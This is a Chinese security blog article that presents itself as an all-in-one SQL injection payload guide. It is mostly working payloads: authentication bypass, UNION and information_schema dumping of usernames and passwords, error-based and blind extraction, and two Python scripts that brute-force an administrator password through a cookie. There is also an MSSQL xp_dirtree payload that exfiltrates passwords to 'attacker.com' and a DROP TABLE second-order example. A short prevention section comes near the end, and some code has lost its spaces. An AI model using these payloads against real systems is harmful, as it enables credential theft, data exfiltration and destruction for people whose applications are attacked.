> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247530928&idx=4&sn=82d83bc86ade01c184699e7ac7eaca24

#  SQL注入：所有概念、所有有效载荷，尽在一处  
 Ots安全   2025-06-16 07:13  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
掌握 SQL 注入：面向初学者和专业人士的深度指南  
  
注意：本指南假设您拥有安全、合法的测试环境（例如，DVWA、OWASP Juice Shop、本地虚拟机）。切勿针对未经授权的目标进行测试。  
  
1.什么是SQL注入？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tacib5RAicquZhgibuGgcXNo5yibcJYrCbkI07wa2H98BkGEH3hibicLYS41HuyWuXnImric1gdsm3zeK2STQ/640?wx_fmt=webp&from=appmsg "")  
  
SQL 注入 (SQLi) 是一种网络安全漏洞，当应用程序将不受信任的用户输入直接合并到 SQL 查询中时就会出现这种漏洞。通过注入包含 SQL 语法的特制字符串，攻击者可以拦截或更改查询逻辑，从而绕过身份验证、提取敏感数据、修改或删除记录，甚至在数据库服务器上执行管理操作。  
  
在典型的注入流程中，用户提供的表单字段、URL 参数或标头值会被串联成查询字符串。例如：  
  

```
SELECT * FROM products WHEREid = '&#34; + userInput + &#34;';
```

  
  
如果userInput是1 OR 1=1，则查询变为：  
  

```
SELECT * FROM products WHEREid = '1'OR1=1;
```

  
  
第二个条件1=1始终为真。因此，应用程序会返回所有产品行，而不仅仅是预期的行。我们之所以选择此有效载荷，是因为它引入了一个始终为真的表达式，演示了如何通过简单的修改绕过预期的查询逻辑。借助更复杂的有效载荷，攻击者可以通过组合其他子句或注释，逐步升级到完全数据库入侵。  
  
2.如何检测SQL注入漏洞  
  
1. 错误观察：  
  
在表单字段、查询参数或 HTTP 标头中 提交单引号 ( ') 或双引号 ( ")。许多数据库会返回描述性错误消息（例如语法错误、类型不匹配或 XML 解析失败），从而揭示注入点。请注意意外的 HTTP 500 状态代码或自定义错误页面。  
  
2. 行为差异：  
  
注入布尔条件，例如OR 1=1versus OR 1=2。观察页面内容、HTTP 状态代码，甚至某些 HTML 元素是否存在等细微变化的差异。这种方法之所以有效，是因为应用程序会同时处理有效和无效的条件，从而确认注入的可行性。  
  
3. 时间测试：  
  
对于盲测环境，注入特定于数据库的休眠函数（SLEEP(5)MySQL、WAITFOR DELAY '0:0:5'MSSQLpg_sleep(5)和 PostgreSQL）。如果响应明显延迟，则表明注入的条件已得到评估。此有效载荷仅依赖于服务器响应时间，无需直接输出。  
  
4. 自动扫描：  
  
使用 sqlmap 或 Burp Suite 的扫描器等工具枚举潜在的注入点。这些工具可以自动生成有效载荷并进行响应分析。然而，它们可能会遗漏自定义业务逻辑漏洞或复杂的 WAF 绕过方法，因此手动测试仍然至关重要。  
  
3. 检索隐藏数据并颠覆逻辑  
  
3.1 身份验证绕过（重言式）  
  
情况：登录表单构建如下查询：  
  

```
SELECT * FROMusersWHERE username = '$user'ANDpassword = '$pass';
```

  
  
注入：提供username: ' OR '1'='1任意密码：  
  

```
SELECT * FROMusersWHERE username = ''OR'1'='1'ANDpassword = 'foo';
```

  
  
此有效载荷通过注入一个始终为真的条件 ( '1'='1') 来破坏 AND 逻辑。我们之所以选择它，是因为它能够可靠地绕过简单的凭证检查，而无需事先知道有效的用户名或密码。数据库会返回第一个匹配的用户记录，通常会授予管理员访问权限。  
  
3.2 条件登录测试  
  
情况：会话跟踪 Cookie（例如 ）TrackingId在有效时会触发自定义消息“欢迎回来！”。内部操作如下：  
  

```
SELECT * FROM sessions WHEREid = 'TrackingId';
```

  
  
注入：将条件切换为真/假：  
  

```
Cookie: TrackingId=xyz' AND '1'='1
Cookie: TrackingId=xyz' AND '1'='2
```

  
  
这些有效载荷的工作原理是将额外的布尔表达式附加到原始查询中。选择'AND '1'='1'可确保条件仍然有效，从而导致应用程序确认会话。相反，'AND '1'='2'始终失败，这演示了布尔差异如何揭示注入点。  
  
4.基于UNION的注入  
  
4.1 确定列数  
  
应用程序通常会返回多列。UNION攻击者在使用之前，必须匹配列数和数据类型。  
  
有效载荷：  
  

```
?id=1' ORDER BY 1--
?id=1' ORDER BY 2--
... 
?id=1' ORDER BY N-- # yields an error when N exceeds column count
```

  
  
每次增量都会测试应用程序是否接受按该列索引排序。如果发生错误，它会指示真实的列数。我们选择这种方法是因为它可靠，并且不需要事先了解架构。  
  
4.2 查找兼容的数据类型  
  
接下来，验证哪些列接受字符串而不是数字：  
  

```
' UNION SELECTNULL, NULL-- # if two columns
' UNION SELECT 'a', 1 -- # test string-integer mix
```

  
  
使用NULL会绕过严格的类型要求，而混合字面量则会测试每列的兼容性。此方法可确保后续数据检索查询不会因类型不匹配而失败。  
  
4.3 提取数据  
  
对齐后，添加您自己的SELECT：  
  

```
?id=1' UNION SELECTid, username, passwordFROMusers--
```

  
  
此有效载荷的工作原理是将合法查询结果与从users表中提取的攻击者控制的数据合并。选择id, username, password与凭证收集的常见兴趣列一致。  
  
5.检查数据库（信息模式）  
  
当表/列名未知时，SQLi 攻击者会利用元数据表：  
  
5.1 枚举表  
  

```
?id=1' UNION SELECTNULL, table_name FROM information_schema.tables--
```

  
  
检索所有表的列表。我们之所以选择information_schema.tables它，是因为它在 SQL 数据库中得到广泛支持。  
  
5.2 枚举列  
  

```
?id=1' UNION SELECTNULL, column_name FROM information_schema.columns WHERE table_name='users'--
```

  
  
筛选表中的列users。这种有针对性的方法避免了过多的输出，并加快了枚举速度。  
  
5.3 转储特定列  
  

```
?id=1' UNION SELECTNULL, CONCAT(username, ':', password) FROMusers--
```

  
  
用分隔符连接用户名和密码。我们选择CONCATand:是为了便于阅读和解析结果。  
  
6.基于错误的SQL注入  
  
当应用程序显示原始数据库错误时，您可以通过触发不同类型的错误来强制错误直接泄露数据。以下是多个有效载荷及其用途：  
  
6.1 转换错误  
  

```
?id=1' AND 1=CONVERT(int,(SELECT @@version))--
```

  
  
SELECT @@version触发类型转换错误，并在错误消息中包含结果。有助于识别数据库引擎和版本。  
  

```
?id=1' AND 1=CAST((SELECTuser()) ASINT)--
```

  
  
对于支持 的系统CAST，这会强制出现转换错误，从而显示当前数据库用户。  
  
6.2 算术和函数错误  
  

```
?id=1' AND (SELECT TOP 1nameFROM sysobjects) LIKE'%user%' / 0--
```

  
  
当第一个表名包含“user”时，除以零，如果为真则导致错误。此有效负载将算术与元数据查询结合在一起。  
  

```
?id=1' AND JSON_VALUE((SELECTCONCAT('{&#34;u&#34;:&#34;', user(), '&#34;}')), '$.u') ISNULL--
```

  
  
在 SQL Server 2016+ 上，JSON_VALUE如果 JSON 格式不正确，则会生成错误，从而泄露 user() 值。  
  
6.3 基于 XML 的错误（MySQL）  
  

```
?id=1' AND UPDATEXML(1, CONCAT(0x7e, (SELECTuser())), 1)--
```

  
  
无效updatexml调用会引发包含用户名的 XML 解析错误。十六进制0x7e( ~) 作为前缀，以便于解析。  
  

```
?id=1' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECTdatabase())))--
```

  
  
类似于UPDATEXML，EXTRACTVALUE嵌入当前数据库名称会触发错误。  
  
7. 盲 SQL 注入  
  
盲 SQLi 依赖于推理而非直接输出。以下是针对布尔值和基于时间的变体的额外负载：  
  
7.1 基于布尔值（条件响应）  
  
当没有返回任何数据或错误时，逐位提取数据。以下是多个有效载荷及其说明：  
  
有效载荷示例1：  
  

```
Cookie: TrackingId=xyz' AND (SELECTCOUNT(*) FROMusers)--
```

  
  
如果计数非零，则条件为真，应用程序可能显示有效会话。用于测试聚合查询。  
  
有效载荷示例2：  
  

```
Cookie: TrackingId=xyz' AND EXISTS(SELECT1FROMusersWHERE username='admin')--
```

  
  
检查“admin”用户是否存在。如果用户存在则返回 True，否则返回 false。  
  
有效载荷示例3（子字符串测试）：  
  

```
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 2, 1) = 'b'--
```

  
  
定位到密码的第二个字符。通过调整位置和字符，可以重建完整的字符串。  
  
7.1.1 使用 Python 实现自动化  
  
点击展开脚本  
  

```
import requests

tracking_id = input(&#34;enter tracking id: &#34;)
session_id = input(&#34;enter session id: &#34;)
url = input(&#34;enter url: &#34;)

# 1) Find length
defget_length():
    for i in range(1, 50):
        payload = f&#34;'+AND+(select+length(password)+from+users+where+username='administrator')={i}--&#34;
        cookies = {&#34;TrackingId&#34;: tracking_id + payload, &#34;session&#34;: session_id}
        r = requests.get(url, cookies=cookies)
        if&#34;Welcome back!&#34;in r.text:
            return i

# 2) Extract characters
defget_password(l):
    charset = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;
    result = &#34;&#34;
    for pos in range(1, l+1):
        for ch in charset:
            payload = f&#34;'+AND+(select+substring(password,{pos},1)+from+users+where+username='administrator')='{ch}'--&#34;
            cookies = {&#34;TrackingId&#34;: tracking_id + payload, &#34;session&#34;: session_id}
            r = requests.get(url, cookies=cookies)
            if&#34;Welcome back!&#34;in r.text:
                result += ch
                break
    return result

length = get_length()
print(&#34;Password length:&#34;, length)
print(&#34;Password:&#34;, get_password(length))
```

  
  
7.1.1 使用 Python 实现自动化  
  
点击展开脚本该脚本计算密码长度，然后使用子字符串检查和布尔反馈迭代提取每个字符。  
  
7.2 基于时间的盲注入  
  
当没有可用的响应差异或错误时，请使用时间延迟。其他有效载荷示例：  
  
有效负载示例 1（MySQL SLEEP）：  
  

```
?id=1' AND IF((SELECTASCII(SUBSTRING(password,1,1)) FROMusersWHERE username='administrator') > 109, SLEEP(5), 0)--
```

  
  
检查首字符的 ASCII 值是否大于 'm' (109)。若为真则进入休眠状态，启用字符值二分查找。  
  
有效载荷示例 2 (MSSQL WAITFOR)：  
  

```
?id=1'; IF (SELECTLEN(password) FROMusersWHERE username='administrator') = 10 WAITFOR DELAY '0:0:5'--
```

  
  
仅当长度等于 10 时才通过休眠来推断密码长度。  
  
PostgreSQL 通过休眠延迟  
  
点击展开脚本  
  

```
import requests, time

session_id = input(&#34;enter session id: &#34;)
url = input(&#34;enter url: &#34;)
charset = &#34;abcdefghijklmnopqrstuvwxyz0123456789&#34;

for pos in range(1, 21):
    for ch in charset:
        payload = (
            f&#34;'||(SELECTCASEWHENsubstring(password,{pos},1)='{ch}'THEN pg_sleep(5) ELSE pg_sleep(0) ENDFROMusersWHERE username='administrator')--&#34;
        )
        cookies = {&#34;TrackingId&#34;: payload, &#34;session&#34;: session_id}
        start = time.time()
        requests.get(url, cookies=cookies)
        if time.time() - start > 4:
            print(f&#34;Position {pos}: {ch}&#34;)
            break
```

  
  
使用 IF 条件pg_sleep可以通过观察延迟来实现按位提取。我们选择此有效载荷用于 PostgreSQL 环境，因为它具有精确性和可靠性。  
  
8.带外（OAST）SQL注入  
  
当数据和错误反馈均未暴露时，触发外部回调：  
  

```
?id=1'; EXEC master..xp_dirtree '\\attacker.com\\'+(SELECTpasswordFROMusers)+'\\share'--
```

  
  
此有效载荷指示数据库服务器对攻击者的域执行网络调用，并将密码嵌入到路径中。我们之所以选择该xp_dirtree函数，是因为它能够在 MSSQL 环境中可靠地进行 DNS 解析。  
  
9. 不同上下文中的 SQL 注入  
  
二阶 SQLi：存储在应用程序中的有效负载（例如，注释、配置文件）稍后在新的 SQL 上下文中使用该数据时执行：  
  

```
-- Initial storage:
INSERTINTO posts (content) VALUES ('Great post'); DROPTABLE comments; --
-- Later, when viewing posts, the DROP TABLE executes.
```

  
  
我们使用这个例子来说明注入如何隐藏在良性输入中并在稍后触发，从而绕过初始清理。  
  
NoSQL 环境：如果用户输入直接嵌入 JSON 查询中，像 MongoDB 这样的文档数据库也会出现类似的缺陷：  
  

```
{ &#34;username&#34;: userInput, &#34;password&#34;: passInput }
```

  
  
注入{ "$ne": null }会绕过这两个字段。此有效载荷利用了 NoSQL 上下文中的类型强制和查询结构。  
  
10. 防止 SQL 注入  
1. 参数化查询/准备好的语句：绑定变量而不是连接字符串。  
  
1. ORM 和查询构建器：依靠自动转义输入的内置方法。  
  
1. 严格输入验证：对 ID 使用允许列表，对电子邮件强制使用正则表达式等。  
  
1. 最小权限：将数据库用户权限限制为仅执行必要的操作。  
  
1. 错误处理：抑制生产中的详细错误；内部记录详细信息。  
  
1. 定期测试：将自动扫描仪与手动渗透测试相结合。  
  
永远不要相信用户输入——始终将其视为数据，而不是代码。  
  
  
11. 其他资源和备忘单  
  
实践平台  
- PortSwigger Web Security Academy: https://portswigger.net/web-security  
  
- DVWA: http://www.dvwa.co.uk/  
  
- OWASP Juice Shop: https://owasp.org/www-project-juice-shop/  
  
- Hack The Box: https://www.hackthebox.com/  
  
- TryHackMe: https://tryhackme.com/  
  
备忘单和参考资料  
- PortSwigger SQL 注入备忘单： https://portswigger.net/kb/sql-injection-cheat-sheet  
  
- OWASP 测试指南 - SQLi： https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_SQL_Injection  
  
- SQLMap 文档： https://sqlmap.org/  
  
结论  
  
SQL 注入仍然是最严重的 Web 漏洞之一。掌握每一种技术——从经典的绕过到高级的 OAST——都能帮助攻击者和防御者有效地保护或利用应用程序。  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
